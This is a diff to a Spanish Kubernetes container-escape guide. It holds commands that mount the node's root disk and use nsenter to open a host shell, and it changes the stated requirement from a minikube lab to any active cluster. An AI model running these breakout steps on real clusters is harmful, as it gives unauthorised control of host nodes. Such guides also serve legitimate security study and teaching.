@@ -17,7 +17,7 @@ al nodo de Kubernetes.
 
 ## Requisitos
 
-- minikube corriendo (`minikube start`)
+- Cluster Kubernetes activo
 - kubectl configurado
 
 ---
@@ -53,7 +53,7 @@ mkdir -p /mnt/host
 # Montar el disco raiz del host
 mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host 2>/dev/null
 
-# Si lo anterior falla, intentar con nsenter (mas confiable en minikube)
+# Alternativa con nsenter (acceso directo al namespace del host)
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 
 # Ahora estamos en el host!
